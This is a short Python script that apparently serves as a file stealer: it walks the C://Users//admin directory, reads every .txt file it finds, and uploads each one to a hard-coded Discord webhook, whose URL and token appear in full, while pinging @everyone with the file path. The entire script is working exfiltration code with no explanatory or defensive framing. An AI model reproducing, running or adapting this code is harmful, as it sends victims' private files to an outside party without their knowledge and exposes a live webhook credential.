import os, re, sys
from dhooks import Webhook
from discord_webhook import DiscordWebhook
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1043721681325260960/Z5lhqhWpo_Vujn_z8alvUhwFUrCIqcqT56XCmt8uTD3hYnDmERlRQIaNrFB0tKsfQkK1')
hook = Webhook('https://discord.com/api/webhooks/1043721681325260960/Z5lhqhWpo_Vujn_z8alvUhwFUrCIqcqT56XCmt8uTD3hYnDmERlRQIaNrFB0tKsfQkK1')
fileExt = [".txt"] #file extensions to search for
if 1 == 1:
    path = "C://Users//admin" #checks if a path parameter was passed
else:
    path = "C://Users//admin" #uses current directory if no parameter was passed
for root, dirs, files in os.walk(path): #loops through all files and subdirectories
    for name in files:
        file = os.path.join(root, name)
        for ext in fileExt:
            fileType = file[file.rfind("."): len(file)] #extracts the file extension from the file path
            if (fileType.lower() == ext.lower()): #checks if file matches a desired type
                print( file)
                with open(file, "rb") as f:
                    webhook.add_file(file=f.read(), filename='123.txt')
                    response = webhook.execute()
                    hook.send("@everyone  ~   " + file)
